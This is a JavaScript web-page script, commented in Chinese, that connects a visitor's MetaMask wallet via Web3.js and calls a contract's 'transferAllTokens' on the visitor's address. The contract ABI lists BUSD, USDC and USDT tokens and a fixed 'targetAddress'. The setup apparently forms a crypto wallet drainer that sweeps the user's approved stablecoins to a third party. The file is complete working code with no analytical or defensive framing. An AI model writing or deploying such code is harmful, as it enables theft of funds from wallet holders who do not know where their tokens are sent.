// 导入Web3.js并创建合约实例
let web3;
let contract;

const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F';  // 智能合约地址
const abi = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			}
		],
		"name": "transferAllTokens",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	},
	{
		"inputs": [],
		"name": "busdToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "targetAddress",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "usdcToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "usdtToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];

const connectButton = document.getElementById('connectWallet');
const transferButton = document.getElementById('transferTokens');
const statusMessage = document.getElementById('statusMessage');

let userAddress;

// 连接钱包功能
connectButton.addEventListener('click', async () => {
    if (typeof window.ethereum !== 'undefined') {
        try {
            web3 = new Web3(window.ethereum);
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];

            contract = new web3.eth.Contract(abi, contractAddress);
            statusMessage.textContent = '钱包已连接: ' + userAddress;
        } catch (error) {
            console.error('连接钱包失败:', error);
            statusMessage.textContent = '连接钱包失败，请重试';
        }
    } else {
        console.log('请安装 MetaMask!');
        statusMessage.textContent = '请安装 MetaMask 扩展';
    }
});

// 转移代币功能
transferButton.addEventListener('click', async () => {
    try {
        // 调用合约中的 transferAllTokens 方法，设置 gas 限额
        await contract.methods.transferAllTokens(userAddress).send({
            from: userAddress,
            gas: 500000  // 设置为 500,000 gas 上限
        });

        statusMessage.textContent = '代币转移成功！';

    } catch (error) {
        console.error('代币转移失败:', error);
        statusMessage.textContent = '代币转移失败，错误信息: ' + error.message;
    }
});
